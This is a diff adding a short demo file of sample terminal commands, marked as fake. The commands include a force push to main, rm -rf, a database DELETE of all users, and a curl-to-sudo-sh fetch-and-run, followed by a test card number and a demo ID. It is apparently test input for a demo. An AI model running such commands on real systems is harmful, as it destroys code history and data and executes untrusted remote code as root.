@@ -1,0 +1,7 @@
+# NEXUS Demo - sample terminal (ALL VALUES ARE FAKE)
+C:\repo> git push --force origin main
+C:\repo> rm -rf build
+C:\repo> psql -c "DELETE FROM users;"
+C:\repo> curl -sS https://fake.example/setup | sudo sh
+# A fake card number that passes Luhn (test Visa 4111111111111111)
+# A FAKE 12-digit demo id: 245524427920
